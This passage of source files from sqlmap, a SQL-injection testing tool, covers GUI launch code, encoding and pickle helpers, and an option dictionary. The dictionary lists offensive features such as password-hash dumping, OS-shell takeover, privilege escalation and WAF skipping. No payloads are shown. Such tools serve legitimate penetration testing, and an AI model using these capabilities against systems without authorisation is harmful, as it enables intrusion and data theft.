\"\\n\")\n\n            return \"break\"\n\n    def run():\n        global alive\n        global process\n        global queue\n\n        config = {}\n\n        for key in window._widgets:\n            dest, type = key\n            widget = window._widgets[key]\n\n            if hasattr(widget, \"get\") and not widget.get():\n                value = None\n            elif type == \"string\":\n                value = widget.get()\n            elif type == \"float\":\n                value = float(widget.get())\n            elif type == \"int\":\n                value = int(widget.get())\n            else:\n                value = bool(widget.var.get())\n\n            config[dest] = value\n\n        for option in parser.option_list:\n            config[option.dest] = defaults.get(option.dest, None)\n\n        handle, configFile = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.CONFIG, text=True)\n        os.close(handle)\n\n        saveConfig(config, configFile)\n\n        def enqueue(stream, queue):\n            global alive\n\n            for line in iter(stream.readline, b''):\n                queue.put(line)\n\n            alive = False\n            stream.close()\n\n        alive = True\n\n        process = subprocess.Popen([sys.executable or \"python\", os.path.join(paths.SQLMAP_ROOT_PATH, \"sqlmap.py\"), \"-c\", configFile], shell=False, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, bufsize=1, close_fds=not IS_WIN)\n\n        # Reference: https://stackoverflow.com/a/4896288\n        queue = _queue.Queue()\n        thread = threading.Thread(target=enqueue, args=(process.stdout, queue))\n        thread.daemon = True\n        thread.start()\n\n        top = _tkinter.Toplevel()\n        top.title(\"Console\")\n\n        # Reference: https://stackoverflow.com/a/13833338\n        text = _tkinter_scrolledtext.ScrolledText(top, undo=True)\n        text.bind(\"<Key>\", onKeyPress)\n        text.bind(\"<Return>\", onReturnPress)\n        text.pack()\n        text.focus()\n\n        center(top)\n\n        while True:\n            line = \"\"\n            try:\n                # line = queue.get_nowait()\n                line = queue.get(timeout=.1)\n                text.insert(_tkinter.END, line)\n            except _queue.Empty:\n                text.see(_tkinter.END)\n                text.update_idletasks()\n\n                if not alive:\n                    break\n\n    menubar = _tkinter.Menu(window)\n\n    filemenu = _tkinter.Menu(menubar, tearoff=0)\n    filemenu.add_command(label=\"Open\", state=_tkinter.DISABLED)\n    filemenu.add_command(label=\"Save\", state=_tkinter.DISABLED)\n    filemenu.add_separator()\n    filemenu.add_command(label=\"Exit\", command=window.quit)\n    menubar.add_cascade(label=\"File\", menu=filemenu)\n\n    menubar.add_command(label=\"Run\", command=run)\n\n    helpmenu = _tkinter.Menu(menubar, tearoff=0)\n    helpmenu.add_command(label=\"Official site\", command=lambda: webbrowser.open(SITE))\n    helpmenu.add_command(label=\"Github pages\", command=lambda: webbrowser.open(GIT_PAGE))\n    helpmenu.add_command(label=\"Wiki pages\", command=lambda: webbrowser.open(WIKI_PAGE))\n    helpmenu.add_command(label=\"Report issue\", command=lambda: webbrowser.open(ISSUES_PAGE))\n    helpmenu.add_separator()\n    helpmenu.add_command(label=\"About\", command=lambda: _tkinter_messagebox.showinfo(\"About\", \"Copyright (c) 2006-2024\\n\\n    (%s)\" % DEV_EMAIL_ADDRESS))\n    menubar.add_cascade(label=\"Help\", menu=helpmenu)\n\n    window.config(menu=menubar)\n    window._widgets = {}\n\n    notebook = AutoresizableNotebook(window)\n\n    first = None\n    frames = {}\n\n    for group in parser.option_groups:\n        frame = frames[group.title] = _tkinter.Frame(notebook, width=200, height=200)\n        notebook.add(frames[group.title], text=group.title)\n\n        _tkinter.Label(frame).grid(column=0, row=0, sticky=_tkinter.W)\n\n        row = 1\n        if group.get_description():\n            _tkinter.Label(frame, text=\"%s:\" % group.get_description()).grid(column=0, row=1, columnspan=3, sticky=_tkinter.W)\n            _tkinter.Label(frame).grid(column=0, row=2, sticky=_tkinter.W)\n            row += 2\n\n        for option in group.option_list:\n            _tkinter.Label(frame, text=\"%s \" % parser.formatter._format_option_strings(option)).grid(column=0, row=row, sticky=_tkinter.W)\n\n            if option.type == \"string\":\n                widget = _tkinter.Entry(frame)\n            elif option.type == \"float\":\n                widget = ConstrainedEntry(frame, regex=r\"\\A\\d*\\.?\\d*\\Z\")\n            elif option.type == \"int\":\n                widget = ConstrainedEntry(frame, regex=r\"\\A\\d*\\Z\")\n            else:\n                var = _tkinter.IntVar()\n                widget = _tkinter.Checkbutton(frame, variable=var)\n                widget.var = var\n\n            first = first or widget\n            widget.grid(column=1, row=row, sticky=_tkinter.W)\n\n            window._widgets[(option.dest, option.type)] = widget\n\n            default = defaults.get(option.dest)\n            if default:\n                if hasattr(widget, \"insert\"):\n                    widget.insert(0, default)\n\n            _tkinter.Label(frame, text=\" %s\" % option.help).grid(column=2, row=row, sticky=_tkinter.W)\n\n            row += 1\n\n        _tkinter.Label(frame).grid(column=0, row=row, sticky=_tkinter.W)\n\n    notebook.pack(expand=1, fill=\"both\")\n    notebook.enable_traversal()\n\n    first.focus()\n\n    window.mainloop()\n", "lib/core/profiling.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport cProfile\nimport os\n\nfrom lib.core.data import logger\nfrom lib.core.data import paths\n\ndef profile(profileOutputFile=None):\n    \"\"\"\n    This will run the program and present profiling data in a nice looking graph\n    \"\"\"\n\n    if profileOutputFile is None:\n        profileOutputFile = os.path.join(paths.SQLMAP_OUTPUT_PATH, \"sqlmap_profile.raw\")\n\n    if os.path.exists(profileOutputFile):\n        os.remove(profileOutputFile)\n\n    # Start sqlmap main function and generate a raw profile file\n    cProfile.run(\"start()\", profileOutputFile)\n\n    infoMsg = \"execution profiled and stored into file '%s' (e.g. 'gprof2dot -f pstats %s | dot -Tpng -o /tmp/sqlmap_profile.png')\" % (profileOutputFile, profileOutputFile)\n    logger.info(infoMsg)\n", "lib/core/convert.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import cPickle as pickle\nexcept:\n    import pickle\n\nimport base64\nimport binascii\nimport codecs\nimport json\nimport re\nimport sys\nimport time\n\nfrom lib.core.bigarray import BigArray\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.settings import INVALID_UNICODE_PRIVATE_AREA\nfrom lib.core.settings import IS_TTY\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import NULL\nfrom lib.core.settings import PICKLE_PROTOCOL\nfrom lib.core.settings import SAFE_HEX_MARKER\nfrom lib.core.settings import UNICODE_ENCODING\nfrom thirdparty import six\nfrom thirdparty.six import unichr as _unichr\nfrom thirdparty.six.moves import collections_abc as _collections\n\ntry:\n    from html import escape as htmlEscape\nexcept ImportError:\n    from cgi import escape as htmlEscape\n\ndef base64pickle(value):\n    \"\"\"\n    Serializes (with pickle) and encodes to Base64 format supplied (binary) value\n\n    >>> base64unpickle(base64pickle([1, 2, 3])) == [1, 2, 3]\n    True\n    \"\"\"\n\n    retVal = None\n\n    try:\n        retVal = encodeBase64(pickle.dumps(value, PICKLE_PROTOCOL), binary=False)\n    except:\n        warnMsg = \"problem occurred while serializing \"\n        warnMsg += \"instance of a type '%s'\" % type(value)\n        singleTimeWarnMessage(warnMsg)\n\n        try:\n            retVal = encodeBase64(pickle.dumps(value), binary=False)\n        except:\n            retVal = encodeBase64(pickle.dumps(str(value), PICKLE_PROTOCOL), binary=False)\n\n    return retVal\n\ndef base64unpickle(value):\n    \"\"\"\n    Decodes value from Base64 to plain format and deserializes (with pickle) its content\n\n    >>> type(base64unpickle('gAJjX19idWlsdGluX18Kb2JqZWN0CnEBKYFxAi4=')) == object\n    True\n    \"\"\"\n\n    retVal = None\n\n    try:\n        retVal = pickle.loads(decodeBase64(value))\n    except TypeError:\n        retVal = pickle.loads(decodeBase64(bytes(value)))\n\n    return retVal\n\ndef htmlUnescape(value):\n    \"\"\"\n    Returns (basic conversion) HTML unescaped value\n\n    >>> htmlUnescape('a&lt;b') == 'a<b'\n    True\n    \"\"\"\n\n    retVal = value\n\n    if value and isinstance(value, six.string_types):\n        replacements = ((\"&lt;\", '<'), (\"&gt;\", '>'), (\"&quot;\", '\"'), (\"&nbsp;\", ' '), (\"&amp;\", '&'), (\"&apos;\", \"'\"))\n        for code, value in replacements:\n            retVal = retVal.replace(code, value)\n\n        try:\n            retVal = re.sub(r\"&#x([^ ;]+);\", lambda match: _unichr(int(match.group(1), 16)), retVal)\n        except (ValueError, OverflowError):\n            pass\n\n    return retVal\n\ndef singleTimeWarnMessage(message):  # Cross-referenced function\n    sys.stdout.write(message)\n    sys.stdout.write(\"\\n\")\n    sys.stdout.flush()\n\ndef filterNone(values):  # Cross-referenced function\n    return [_ for _ in values if _] if isinstance(values, _collections.Iterable) else values\n\ndef isListLike(value):  # Cross-referenced function\n    return isinstance(value, (list, tuple, set, BigArray))\n\ndef shellExec(cmd):  # Cross-referenced function\n    raise NotImplementedError\n\ndef jsonize(data):\n    \"\"\"\n    Returns JSON serialized data\n\n    >>> jsonize({'foo':'bar'})\n    '{\\\\n    \"foo\": \"bar\"\\\\n}'\n    \"\"\"\n\n    return json.dumps(data, sort_keys=False, indent=4)\n\ndef dejsonize(data):\n    \"\"\"\n    Returns JSON deserialized data\n\n    >>> dejsonize('{\\\\n    \"foo\": \"bar\"\\\\n}') == {u'foo': u'bar'}\n    True\n    \"\"\"\n\n    return json.loads(data)\n\ndef rot13(data):\n    \"\"\"\n    Returns ROT13 encoded/decoded text\n\n    >>> rot13('foobar was here!!')\n    'sbbone jnf urer!!'\n    >>> rot13('sbbone jnf urer!!')\n    'foobar was here!!'\n    \"\"\"\n\n    # Reference: https://stackoverflow.com/a/62662878\n    retVal = \"\"\n    alphabit = \"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    for char in data:\n        retVal += alphabit[alphabit.index(char) + 13] if char in alphabit else char\n    return retVal\n\ndef decodeHex(value, binary=True):\n    \"\"\"\n    Returns a decoded representation of provided hexadecimal value\n\n    >>> decodeHex(\"313233\") == b\"123\"\n    True\n    >>> decodeHex(\"313233\", binary=False) == u\"123\"\n    True\n    \"\"\"\n\n    retVal = value\n\n    if isinstance(value, six.binary_type):\n        value = getText(value)\n\n    if value.lower().startswith(\"0x\"):\n        value = value[2:]\n\n    try:\n        retVal = codecs.decode(value, \"hex\")\n    except LookupError:\n        retVal = binascii.unhexlify(value)\n\n    if not binary:\n        retVal = getText(retVal)\n\n    return retVal\n\ndef encodeHex(value, binary=True):\n    \"\"\"\n    Returns a encoded representation of provided string value\n\n    >>> encodeHex(b\"123\") == b\"313233\"\n    True\n    >>> encodeHex(\"123\", binary=False)\n    '313233'\n    >>> encodeHex(b\"123\"[0]) == b\"31\"\n    True\n    \"\"\"\n\n    if isinstance(value, int):\n        value = six.unichr(value)\n\n    if isinstance(value, six.text_type):\n        value = value.encode(UNICODE_ENCODING)\n\n    try:\n        retVal = codecs.encode(value, \"hex\")\n    except LookupError:\n        retVal = binascii.hexlify(value)\n\n    if not binary:\n        retVal = getText(retVal)\n\n    return retVal\n\ndef decodeBase64(value, binary=True, encoding=None):\n    \"\"\"\n    Returns a decoded representation of provided Base64 value\n\n    >>> decodeBase64(\"MTIz\") == b\"123\"\n    True\n    >>> decodeBase64(\"MTIz\", binary=False)\n    '123'\n    >>> decodeBase64(\"A-B_CDE\") == decodeBase64(\"A+B/CDE\")\n    True\n    >>> decodeBase64(b\"MTIzNA\") == b\"1234\"\n    True\n    >>> decodeBase64(\"MTIzNA\") == b\"1234\"\n    True\n    >>> decodeBase64(\"MTIzNA==\") == b\"1234\"\n    True\n    \"\"\"\n\n    if value is None:\n        return None\n\n    padding = b'=' if isinstance(value, bytes) else '='\n\n    # Reference: https://stackoverflow.com/a/49459036\n    if not value.endswith(padding):\n        value += 3 * padding\n\n    # Reference: https://en.wikipedia.org/wiki/Base64#URL_applications\n    # Reference: https://perldoc.perl.org/MIME/Base64.html\n    if isinstance(value, bytes):\n        value = value.replace(b'-', b'+').replace(b'_', b'/')\n    else:\n        value = value.replace('-', '+').replace('_', '/')\n\n    retVal = base64.b64decode(value)\n\n    if not binary:\n        retVal = getText(retVal, encoding)\n\n    return retVal\n\ndef encodeBase64(value, binary=True, encoding=None, padding=True, safe=False):\n    \"\"\"\n    Returns a decoded representation of provided Base64 value\n\n    >>> encodeBase64(b\"123\") == b\"MTIz\"\n    True\n    >>> encodeBase64(u\"1234\", binary=False)\n    'MTIzNA=='\n    >>> encodeBase64(u\"1234\", binary=False, padding=False)\n    'MTIzNA'\n    >>> encodeBase64(decodeBase64(\"A-B_CDE\"), binary=False, safe=True)\n    'A-B_CDE'\n    \"\"\"\n\n    if value is None:\n        return None\n\n    if isinstance(value, six.text_type):\n        value = value.encode(encoding or UNICODE_ENCODING)\n\n    retVal = base64.b64encode(value)\n\n    if not binary:\n        retVal = getText(retVal, encoding)\n\n    if safe:\n        padding = False\n\n        # Reference: https://en.wikipedia.org/wiki/Base64#URL_applications\n        # Reference: https://perldoc.perl.org/MIME/Base64.html\n        if isinstance(retVal, bytes):\n            retVal = retVal.replace(b'+', b'-').replace(b'/', b'_')\n        else:\n            retVal = retVal.replace('+', '-').replace('/', '_')\n\n    if not padding:\n        retVal = retVal.rstrip(b'=' if isinstance(retVal, bytes) else '=')\n\n    return retVal\n\ndef getBytes(value, encoding=None, errors=\"strict\", unsafe=True):\n    \"\"\"\n    Returns byte representation of provided Unicode value\n\n    >>> getBytes(u\"foo\\\\\\\\x01\\\\\\\\x83\\\\\\\\xffbar\") == b\"foo\\\\x01\\\\x83\\\\xffbar\"\n    True\n    \"\"\"\n\n    retVal = value\n\n    if encoding is None:\n        encoding = conf.get(\"encoding\") or UNICODE_ENCODING\n\n    try:\n        codecs.lookup(encoding)\n    except (LookupError, TypeError):\n        encoding = UNICODE_ENCODING\n\n    if isinstance(value, six.text_type):\n        if INVALID_UNICODE_PRIVATE_AREA:\n            if unsafe:\n                for char in xrange(0xF0000, 0xF00FF + 1):\n                    value = value.replace(_unichr(char), \"%s%02x\" % (SAFE_HEX_MARKER, char - 0xF0000))\n\n            retVal = value.encode(encoding, errors)\n\n            if unsafe:\n                retVal = re.sub(r\"%s([0-9a-f]{2})\" % SAFE_HEX_MARKER, lambda _: decodeHex(_.group(1)), retVal)\n        else:\n            try:\n                retVal = value.encode(encoding, errors)\n            except UnicodeError:\n                retVal = value.encode(UNICODE_ENCODING, errors=\"replace\")\n\n            if unsafe:\n                retVal = re.sub(b\"\\\\\\\\x([0-9a-f]{2})\", lambda _: decodeHex(_.group(1)), retVal)\n\n    return retVal\n\ndef getOrds(value):\n    \"\"\"\n    Returns ORD(...) representation of provided string value\n\n    >>> getOrds(u'fo\\\\xf6bar')\n    [102, 111, 246, 98, 97, 114]\n    >>> getOrds(b\"fo\\\\xc3\\\\xb6bar\")\n    [102, 111, 195, 182, 98, 97, 114]\n    \"\"\"\n\n    return [_ if isinstance(_, int) else ord(_) for _ in value]\n\ndef getUnicode(value, encoding=None, noneToNull=False):\n    \"\"\"\n    Returns the unicode representation of the supplied value\n\n    >>> getUnicode('test') == u'test'\n    True\n    >>> getUnicode(1) == u'1'\n    True\n    >>> getUnicode(None) == 'None'\n    True\n    \"\"\"\n\n    # Best position for --time-limit mechanism\n    if conf.get(\"timeLimit\") and kb.get(\"startTime\") and (time.time() - kb.startTime > conf.timeLimit):\n        raise SystemExit\n\n    if noneToNull and value is None:\n        return NULL\n\n    if isinstance(value, six.text_type):\n        return value\n    elif isinstance(value, six.binary_type):\n        # Heuristics (if encoding not explicitly specified)\n        candidates = filterNone((encoding, kb.get(\"pageEncoding\") if kb.get(\"originalPage\") else None, conf.get(\"encoding\"), UNICODE_ENCODING, sys.getfilesystemencoding()))\n        if all(_ in value for _ in (b'<', b'>')):\n            pass\n        elif any(_ in value for _ in (b\":\\\\\", b'/', b'.')) and b'\\n' not in value:\n            candidates = filterNone((encoding, sys.getfilesystemencoding(), kb.get(\"pageEncoding\") if kb.get(\"originalPage\") else None, UNICODE_ENCODING, conf.get(\"encoding\")))\n        elif conf.get(\"encoding\") and b'\\n' not in value:\n            candidates = filterNone((encoding, conf.get(\"encoding\"), kb.get(\"pageEncoding\") if kb.get(\"originalPage\") else None, sys.getfilesystemencoding(), UNICODE_ENCODING))\n\n        for candidate in candidates:\n            try:\n                return six.text_type(value, candidate)\n            except (UnicodeDecodeError, LookupError):\n                pass\n\n        try:\n            return six.text_type(value, encoding or (kb.get(\"pageEncoding\") if kb.get(\"originalPage\") else None) or UNICODE_ENCODING)\n        except UnicodeDecodeError:\n            return six.text_type(value, UNICODE_ENCODING, errors=\"reversible\")\n    elif isListLike(value):\n        value = list(getUnicode(_, encoding, noneToNull) for _ in value)\n        return value\n    else:\n        try:\n            return six.text_type(value)\n        except UnicodeDecodeError:\n            return six.text_type(str(value), errors=\"ignore\")  # encoding ignored for non-basestring instances\n\ndef getText(value, encoding=None):\n    \"\"\"\n    Returns textual value of a given value (Note: not necessary Unicode on Python2)\n\n    >>> getText(b\"foobar\")\n    'foobar'\n    >>> isinstance(getText(u\"fo\\\\u2299bar\"), six.text_type)\n    True\n    \"\"\"\n\n    retVal = value\n\n    if isinstance(value, six.binary_type):\n        retVal = getUnicode(value, encoding)\n\n    if six.PY2:\n        try:\n            retVal = str(retVal)\n        except:\n            pass\n\n    return retVal\n\ndef stdoutEncode(value):\n    \"\"\"\n    Returns binary representation of a given Unicode value safe for writing to stdout\n    \"\"\"\n\n    value = value or \"\"\n\n    if IS_WIN and IS_TTY and kb.get(\"codePage\", -1) is None:\n        output = shellExec(\"chcp\")\n        match = re.search(r\": (\\d{3,})\", output or \"\")\n\n        if match:\n            try:\n                candidate = \"cp%s\" % match.group(1)\n                codecs.lookup(candidate)\n            except LookupError:\n                pass\n            else:\n                kb.codePage = candidate\n\n        kb.codePage = kb.codePage or \"\"\n\n    if isinstance(value, six.text_type):\n        encoding = kb.get(\"codePage\") or getattr(sys.stdout, \"encoding\", None) or UNICODE_ENCODING\n\n        while True:\n            try:\n                retVal = value.encode(encoding)\n                break\n            except UnicodeEncodeError as ex:\n                value = value[:ex.start] + \"?\" * (ex.end - ex.start) + value[ex.end:]\n\n                warnMsg = \"cannot properly display (some) Unicode characters \"\n                warnMsg += \"inside your terminal ('%s') environment. All \" % encoding\n                warnMsg += \"unhandled occurrences will result in \"\n                warnMsg += \"replacement with '?' character. Please, find \"\n                warnMsg += \"proper character representation inside \"\n                warnMsg += \"corresponding output files\"\n                singleTimeWarnMessage(warnMsg)\n\n        if six.PY3:\n            retVal = getUnicode(retVal, encoding)\n\n    else:\n        retVal = value\n\n    return retVal\n\ndef getConsoleLength(value):\n    \"\"\"\n    Returns console width of unicode values\n\n    >>> getConsoleLength(\"abc\")\n    3\n    >>> getConsoleLength(u\"\\\\u957f\\\\u6c5f\")\n    4\n    \"\"\"\n\n    if isinstance(value, six.text_type):\n        retVal = sum((2 if ord(_) >= 0x3000 else 1) for _ in value)\n    else:\n        retVal = len(value)\n\n    return retVal\n", "lib/core/optiondict.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\noptDict = {\n    # Family: {\"parameter name\": \"parameter datatype\"},\n    # --OR--\n    # Family: {\"parameter name\": (\"parameter datatype\", \"category name used for common outputs feature\")},\n\n    \"Target\": {\n        \"direct\": \"string\",\n        \"url\": \"string\",\n        \"logFile\": \"string\",\n        \"bulkFile\": \"string\",\n        \"requestFile\": \"string\",\n        \"sessionFile\": \"string\",\n        \"googleDork\": \"string\",\n        \"configFile\": \"string\",\n    },\n\n    \"Request\": {\n        \"method\": \"string\",\n        \"data\": \"string\",\n        \"paramDel\": \"string\",\n        \"cookie\": \"string\",\n        \"cookieDel\": \"string\",\n        \"liveCookies\": \"string\",\n        \"loadCookies\": \"string\",\n        \"dropSetCookie\": \"boolean\",\n        \"agent\": \"string\",\n        \"mobile\": \"boolean\",\n        \"randomAgent\": \"boolean\",\n        \"host\": \"string\",\n        \"referer\": \"string\",\n        \"headers\": \"string\",\n        \"authType\": \"string\",\n        \"authCred\": \"string\",\n        \"authFile\": \"string\",\n        \"abortCode\": \"string\",\n        \"ignoreCode\": \"string\",\n        \"ignoreProxy\": \"boolean\",\n        \"ignoreRedirects\": \"boolean\",\n        \"ignoreTimeouts\": \"boolean\",\n        \"proxy\": \"string\",\n        \"proxyCred\": \"string\",\n        \"proxyFile\": \"string\",\n        \"proxyFreq\": \"integer\",\n        \"tor\": \"boolean\",\n        \"torPort\": \"integer\",\n        \"torType\": \"string\",\n        \"checkTor\": \"boolean\",\n        \"delay\": \"float\",\n        \"timeout\": \"float\",\n        \"retries\": \"integer\",\n        \"retryOn\": \"string\",\n        \"rParam\": \"string\",\n        \"safeUrl\": \"string\",\n        \"safePost\": \"string\",\n        \"safeReqFile\": \"string\",\n        \"safeFreq\": \"integer\",\n        \"skipUrlEncode\": \"boolean\",\n        \"csrfToken\": \"string\",\n        \"csrfUrl\": \"string\",\n        \"csrfMethod\": \"string\",\n        \"csrfData\": \"string\",\n        \"csrfRetries\": \"integer\",\n        \"forceSSL\": \"boolean\",\n        \"chunked\": \"boolean\",\n        \"hpp\": \"boolean\",\n        \"evalCode\": \"string\",\n    },\n\n    \"Optimization\": {\n        \"optimize\": \"boolean\",\n        \"predictOutput\": \"boolean\",\n        \"keepAlive\": \"boolean\",\n        \"nullConnection\": \"boolean\",\n        \"threads\": \"integer\",\n    },\n\n    \"Injection\": {\n        \"testParameter\": \"string\",\n        \"skip\": \"string\",\n        \"skipStatic\": \"boolean\",\n        \"paramExclude\": \"string\",\n        \"paramFilter\": \"string\",\n        \"dbms\": \"string\",\n        \"dbmsCred\": \"string\",\n        \"os\": \"string\",\n        \"invalidBignum\": \"boolean\",\n        \"invalidLogical\": \"boolean\",\n        \"invalidString\": \"boolean\",\n        \"noCast\": \"boolean\",\n        \"noEscape\": \"boolean\",\n        \"prefix\": \"string\",\n        \"suffix\": \"string\",\n        \"tamper\": \"string\",\n    },\n\n    \"Detection\": {\n        \"level\": \"integer\",\n        \"risk\": \"integer\",\n        \"string\": \"string\",\n        \"notString\": \"string\",\n        \"regexp\": \"string\",\n        \"code\": \"integer\",\n        \"smart\": \"boolean\",\n        \"textOnly\": \"boolean\",\n        \"titles\": \"boolean\",\n    },\n\n    \"Techniques\": {\n        \"technique\": \"string\",\n        \"timeSec\": \"integer\",\n        \"uCols\": \"string\",\n        \"uChar\": \"string\",\n        \"uFrom\": \"string\",\n        \"uValues\": \"string\",\n        \"dnsDomain\": \"string\",\n        \"secondUrl\": \"string\",\n        \"secondReq\": \"string\",\n    },\n\n    \"Fingerprint\": {\n        \"extensiveFp\": \"boolean\",\n    },\n\n    \"Enumeration\": {\n        \"getAll\": \"boolean\",\n        \"getBanner\": (\"boolean\", \"Banners\"),\n        \"getCurrentUser\": (\"boolean\", \"Users\"),\n        \"getCurrentDb\": (\"boolean\", \"Databases\"),\n        \"getHostname\": \"boolean\",\n        \"isDba\": \"boolean\",\n        \"getUsers\": (\"boolean\", \"Users\"),\n        \"getPasswordHashes\": (\"boolean\", \"Passwords\"),\n        \"getPrivileges\": (\"boolean\", \"Privileges\"),\n        \"getRoles\": (\"boolean\", \"Roles\"),\n        \"getDbs\": (\"boolean\", \"Databases\"),\n        \"getTables\": (\"boolean\", \"Tables\"),\n        \"getColumns\": (\"boolean\", \"Columns\"),\n        \"getSchema\": \"boolean\",\n        \"getCount\": \"boolean\",\n        \"dumpTable\": \"boolean\",\n        \"dumpAll\": \"boolean\",\n        \"search\": \"boolean\",\n        \"getComments\": \"boolean\",\n        \"getStatements\": \"boolean\",\n        \"db\": \"string\",\n        \"tbl\": \"string\",\n        \"col\": \"string\",\n        \"exclude\": \"string\",\n        \"pivotColumn\": \"string\",\n        \"dumpWhere\": \"string\",\n        \"user\": \"string\",\n        \"excludeSysDbs\": \"boolean\",\n        \"limitStart\": \"integer\",\n        \"limitStop\": \"integer\",\n        \"firstChar\": \"integer\",\n        \"lastChar\": \"integer\",\n        \"sqlQuery\": \"string\",\n        \"sqlShell\": \"boolean\",\n        \"sqlFile\": \"string\",\n    },\n\n    \"Brute\": {\n        \"commonTables\": \"boolean\",\n        \"commonColumns\": \"boolean\",\n        \"commonFiles\": \"boolean\",\n    },\n\n    \"User-defined function\": {\n        \"udfInject\": \"boolean\",\n        \"shLib\": \"string\",\n    },\n\n    \"File system\": {\n        \"fileRead\": \"string\",\n        \"fileWrite\": \"string\",\n        \"fileDest\": \"string\",\n    },\n\n    \"Takeover\": {\n        \"osCmd\": \"string\",\n        \"osShell\": \"boolean\",\n        \"osPwn\": \"boolean\",\n        \"osSmb\": \"boolean\",\n        \"osBof\": \"boolean\",\n        \"privEsc\": \"boolean\",\n        \"msfPath\": \"string\",\n        \"tmpPath\": \"string\",\n    },\n\n    \"Windows\": {\n        \"regRead\": \"boolean\",\n        \"regAdd\": \"boolean\",\n        \"regDel\": \"boolean\",\n        \"regKey\": \"string\",\n        \"regVal\": \"string\",\n        \"regData\": \"string\",\n        \"regType\": \"string\",\n    },\n\n    \"General\": {\n        \"trafficFile\": \"string\",\n        \"abortOnEmpty\": \"boolean\",\n        \"answers\": \"string\",\n        \"batch\": \"boolean\",\n        \"base64Parameter\": \"string\",\n        \"base64Safe\": \"boolean\",\n        \"binaryFields\": \"string\",\n        \"charset\": \"string\",\n        \"checkInternet\": \"boolean\",\n        \"cleanup\": \"boolean\",\n        \"crawlDepth\": \"integer\",\n        \"crawlExclude\": \"string\",\n        \"csvDel\": \"string\",\n        \"dumpFile\": \"string\",\n        \"dumpFormat\": \"string\",\n        \"encoding\": \"string\",\n        \"eta\": \"boolean\",\n        \"flushSession\": \"boolean\",\n        \"forms\": \"boolean\",\n        \"freshQueries\": \"boolean\",\n        \"googlePage\": \"integer\",\n        \"harFile\": \"string\",\n        \"hexConvert\": \"boolean\",\n        \"outputDir\": \"string\",\n        \"parseErrors\": \"boolean\",\n        \"postprocess\": \"string\",\n        \"preprocess\": \"string\",\n        \"repair\": \"boolean\",\n        \"saveConfig\": \"string\",\n        \"scope\": \"string\",\n        \"skipHeuristics\": \"boolean\",\n        \"skipWaf\": \"boolean\",\n        \"testFilter\": \"string\",\n        \"testSkip\": \"string\",\n        \"timeLimit\": \"float\",\n        \"unsafeNaming\": \"boolean\",\n        \"webRoot\": \"string\",\n    },\n\n    \"Miscellaneous\": {\n        \"alert\": \"string\",\n        \"beep\": \"boolean\",\n        \"dependencies\": \"boolean\",\n        \"disableColoring\": \"boolean\",\n        \"listTampers\": \"boolean\",\n        \"noLogging\": \"boolean\",\n        \"offline\": \"boolean\",\n        \"purge\": \"boolean\",\n        \"resultsFile\": \"string\",\n        \"tmpDir\": \"string\",\n        \"unstable\": \"boolean\",\n        \"updateAll\": \"boolean\",\n        \"wizard\": \"boolean\",\n        \"verbose\": \"integer\",\n    },\n\n    \"Hidden\": {\n        \"dummy\": \"boolean\",\n        \"disablePrecon\": \"boolean\",\n        \"profile\": \"boolean\",\n        \"forceDns\": \"boolean\",\n        \"murphyRate\": \"integer\",\n        \"smokeTest\": \"boolean\",\n    },\n\n    \"API\": {\n        \"api\": \"boolean\",\n        \"taskid\": \"string\",\n        \"database\": \"string\",\n    }\n}\n", "lib/core/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\npass\n", "lib/core/compat.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport binascii\nimport functools\nimport math\nimport os\nimport random\nimport re\nimport sys\nimport time\nimport uuid\n\nclass WichmannHill(random.Random):\n    \"\"\"\n    Reference: https://svn.python.org/projects/python/trunk/Lib/random.py\n    \"\"\"\n\n    VERSION = 1     # used by getstate/setstate\n\n    def seed(self, a=None):\n        \"\"\"Initialize internal state from hashable object.\n\n        None or no argument seeds from current time or from an operating\n        system specific randomness source if available.\n\n        If a is not None or an int or long, hash(a) is used instead.\n\n        If a is an int or long, a is used directly.  Distinct values between\n        0 and 27814431486575L inclusive are guaranteed to yield distinct\n        internal states (this guarantee is specific to the default\n        Wichmann-Hill generator).\n        \"\"\"\n\n        if a is None:\n            try:\n                a = int(binascii.hexlify(os.urandom(16)), 16)\n            except NotImplementedError:\n                a = int(time.time() * 256)  # use fractional seconds\n\n        if not isinstance(a, int):\n            a = hash(a)\n\n        a, x = divmod(a, 30268)\n        a, y = divmod(a, 30306)\n        a, z = divmod(a, 30322)\n        self._seed = int(x) + 1, int(y) + 1, int(z) + 1\n\n        self.gauss_next = None\n\n    def random(self):\n        \"\"\"Get the next random number in the range [0.0, 1.0).\"\"\"\n\n        # Wichman-Hill random number generator.\n        #\n        # Wichmann, B. A. & Hill, I. D. (1982)\n        # Algorithm AS 183:\n        # An efficient and portable pseudo-random number generator\n        # Applied Statistics 31 (1982) 188-190\n        #\n        # see also:\n        #        Correction to Algorithm AS 183\n        #        Applied Statistics 33 (1984) 123\n        #\n        #        McLeod, A. I. (1985)\n        #        A remark on Algorithm AS 183\n        #        Applied Statistics 34 (1985),198-200\n\n        # This part is thread-unsafe:\n        # BEGIN CRITICAL SECTION\n        x, y, z = self._seed\n        x = (171 * x) % 30269\n        y = (172 * y) % 30307\n        z = (170 * z) % 30323\n        self._seed = x, y, z\n        # END CRITICAL SECTION\n\n        # Note:  on a platform using IEEE-754 double arithmetic, this can\n        # never return 0.0 (asserted by Tim; proof too long for a 